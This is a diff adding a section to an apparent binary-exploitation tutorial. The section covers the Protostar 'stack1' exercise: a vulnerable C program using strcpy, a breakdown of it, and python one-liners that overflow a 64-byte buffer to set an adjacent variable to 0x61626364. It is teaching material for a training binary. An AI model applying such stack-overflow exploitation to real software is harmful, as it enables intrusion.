@@ -208,6 +208,112 @@ We send 108 'A's to overwrite the 100 bytes that is allocated for `name`, the 4 
 
 This idea is extended on in Return Oriented Programming.
 
+### Overwrite values on stack
+
+For example, we are given the following code in C language:
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+ volatile int modified;
+ char buffer[64];
+
+ if(argc == 1) {
+  errx(1, "please specify an argument\n");
+ }
+
+ modified = 0;
+ strcpy(buffer, argv[1]);
+
+ if(modified == 0x61626364) {
+  printf("you have correctly got the variable to the right value\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+}
+```
+
+#### Breakdown
+
+So this code :
+
+creates a variable called “modified” and assigns a buffer of 64 chars to it.
+
+```
+volatile int modified; 
+char buffer[64];
+```
+
+Checks if we supplied an argument or not.
+
+```
+if(argc == 1) {
+ errx(1, "please specify an argument\n");
+}
+```
+
+Sets the value of the “modified” variable into 0 , then it copies whatever we give it `argv[1]` into the buffer of “modified”.
+
+```
+modified = 0;
+strcpy(buffer, argv[1]);
+```
+
+Then it checks if the variable’s value is `0x61626364` or not
+
+```
+if(modified == 0x61626364) {
+  printf("you have correctly got the variable to the right value\n");
+ } else {
+  printf("Try again, you got 0x%08x\n", modified);
+ }
+```
+
+#### Solution
+
+So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is `0x61626364` in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it.
+
+Let’s execute stack1
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/1.png)
+
+We get please specify an argument so let’s enter anything.
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/2.png)
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/3.png)
+
+We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b”
+
+```
+./stack1 `python -c "print ('A' * 64 + 'b')"`
+```
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/4.png)
+
+And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that.
+
+```
+./stack1 `python -c "print ('A' * 64 + 'dcba')"`
+```
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/5.png)
+
+And we did it !
+
+But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.
+
+```
+./stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
+```
+
+![img](https://0xrick.github.io/images/binary-exploitation/BOF2/6.png)
+
 ## Shellcode
 
 In real exploits, it's not particularly likely that you will have a `win()` function lying around - shellcode is a way to run your **own** instructions, giving you the ability to run arbitrary commands on the system.
